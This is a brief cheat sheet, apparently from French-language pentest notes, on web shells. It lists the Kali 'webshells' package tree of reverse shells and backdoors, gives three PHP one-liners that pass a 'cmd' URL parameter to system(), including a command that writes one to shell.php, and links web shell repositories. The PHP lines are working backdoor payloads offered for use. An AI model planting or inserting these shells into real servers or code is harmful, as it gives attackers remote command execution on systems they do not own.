
```bash
sudo apt install webshells

/usr/share/webshells/
├── asp
│   ├── cmd-asp-5.1.asp
│   └── cmdasp.asp
├── aspx
│   └── cmdasp.aspx
├── cfm
│   └── cfexec.cfm
├── jsp
│   ├── cmdjsp.jsp
│   └── jsp-reverse.jsp
├── perl
│   ├── perlcmd.cgi
│   └── perl-reverse-shell.pl
└── php
    ├── findsock.c
    ├── php-backdoor.php
    ├── php-findsock-shell.php
    ├── php-reverse-shell.php
    ├── qsd-php-backdoor.php
    └── simple-backdoor.php

```

# PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo system($_GET['cmd']); ?>     // avec echo -  affiche aussi le retour
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

# Ressources

* https://github.com/tennc/webshell
* https://github.com/nicholasaleks/webshells
* https://github.com/epinna/weevely3
